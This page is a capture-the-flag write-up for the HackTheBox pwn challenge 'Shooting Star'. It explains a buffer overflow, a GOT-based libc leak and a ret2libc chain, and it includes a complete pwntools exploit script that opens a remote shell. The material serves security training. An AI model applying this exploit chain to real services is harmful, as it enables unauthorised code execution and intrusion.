@@ -1,0 +1,111 @@
+<div class="page-header">
+    <div class="page-header-inner">
+        <div class="page-header-inner2">
+            <h1>PWN/Shooting Star - Easy</h1>
+            <h2>August 2021</h2>
+            <h4>Ret2libc Got Leak</h4>
+        </div>
+    </div>
+</div>
+<H4>Problem</H4>
+<div class="paragraph">
+    <p>
+    Tired of exploring the never-ending world, you lie down and enjoy the crystal clear sky. Over a million stars above your head! Enjoy the silence and the glorious stars while you rest.
+    <br>
+    </p>
+</div>
+<H4>Solution</H4>
+<div class="paragraph">
+    <p>
+    	This challenge gives us a binary to download and develop the exploit for locally, and then an address to connect to remotely and retrieve the flag from using the developed exploit.
+        <br><br>
+    	The binary is pretty short. It has some useless code paths, but there really is only one interesting line. The star function reads in 0x200 bytes into a local buffer which results in a buffer overflow. Unfortunately this is the only bug in the binary and we have to deal with aslr, so we first need to get a memory leak. Luckily for us pie is not enabled, so we have access to all rop gadgets in the binary itself and can use the got section to leak a libc address. 
+    	<br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/hackthebox/shooting_star1.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        This exploit will have 2 separate payloads. The first will be constructed using gadgets contained in the binary. The purpose of this payload will be to leak a libc address so that we have access to more gadgets. To achieve this we will execute 'write(stdout,READ_GOT,size)'. This will execute write using a got entry as its argument, thus leaking a libc address. Finally we will return to main so we can exploit the vulnerability again using our second payload. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/hackthebox/shooting_star2.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        Now that we have a libc leak we can craft a simple ret2libc payload. <br><br>This exploit successfully spawns a shell and lets use retrieve the flag. The full exploit is posted below.
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/hackthebox/shooting_star9.png" alt="">
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+#!/usr/bin/env python
+
+from pwn import *
+elf = context.binary = ELF('./vuln')
+libc = elf.libc
+
+local = False
+
+if local:
+    p = elf.process()
+else:
+    host = '46.101.23.188'
+    port = 31686
+    p = remote(host,port)
+
+rop = ROP([elf])
+
+WRITE_PLT = p64(elf.plt['write'])
+WRITE_GOT = p64(elf.got['read'])
+pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret'])[0])
+pop_rsi_r15 = p64(0x4012c9)
+main = p64(elf.sym['main'])
+
+payload1 = b'A'*72 + pop_rsi_r15 + WRITE_GOT + p64(0x0) + pop_rdi + p64(0x1) + WRITE_PLT + main
+
+p.sendline('1')
+p.sendline(payload1)
+
+p.recvuntil('true!\n')
+data = p.recv(8)
+libc.address = u64(data.ljust(8,b"\x00")) - 0x110140
+p.clean()
+print('[+] Libc Address: ' + str(hex(libc.address)))
+
+binsh = p64(next(libc.search(b'/bin/sh\x00')))
+system = p64(libc.sym['system'])
+ret = p64(rop.find_gadget(['ret'])[0])
+
+payload2 = b'A'*72 + pop_rdi + binsh + system
+
+p.sendline('1')
+p.sendline(payload2)
+
+p.interactive()
+        </code>
+    </pre>
+</div>
+<br><br>
+
+<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
